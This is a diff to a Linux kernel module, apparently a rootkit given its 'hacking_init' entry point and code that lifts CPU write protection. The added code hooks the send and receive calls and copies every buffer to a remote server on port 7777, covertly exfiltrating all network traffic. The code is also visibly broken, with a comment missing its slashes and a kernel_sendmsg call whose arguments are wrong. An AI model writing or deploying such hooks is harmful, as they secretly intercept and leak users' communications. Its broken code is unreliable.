@@ -122,6 +122,51 @@ static inline void protect_memory(unsigned long original_cr0)
     native_write_cr0(original_cr0);
 }
 
+// Function for sending data to a remote server
+void send_data_to_server(const void *buf, size_t len) {
+    struct socket *socket; // socket for the network connexion
+    struct sockaddr_in server_addr; // server details
+    mm_segment_t oldfs; the current kernel segment
+
+    // Create a socket
+    kernel_socket(AF_INET, SOCK_STREAM, 0, &socket); // AF_INET for IPv4 and SOCK_STREAM for TCP
+
+    // Set up the server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = in_aton("ip"); // IP ASCII to binary
+    server_addr.sin_port = htons(7777); // Server port
+ 
+    kernel_connect(socket, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
+ 
+    oldfs = get_fs();
+    set_fs(KERNEL_DS);
+  
+    kernel_sendmsg(socket, buf, len, NULL);
+    
+    set_fs(oldfs);
+    kernel_sock_shutdown(socket, SHUT_RDWR);
+    kernel_sock_release(socket, NULL);
+}
+
+asmlinkage ssize_t new_send(struct socket *sock, const void *buf, size_t len, int flags) {
+
+    ssize_t result = original_send(sock, buf, len, flags);
+    send_data_to_server(buf, result);
+
+    return result;
+}
+
+asmlinkage ssize_t new_recv(struct socket *sock, void *buf, size_t len, int flags) {
+
+    ssize_t result = original_recv(sock, buf, len, flags);
+
+    send_data_to_server(buf, result);
+
+    return result;
+}
+
+
 static int __init hacking_init(void)
 {
     // kprobe kallsyms_lookup_name function
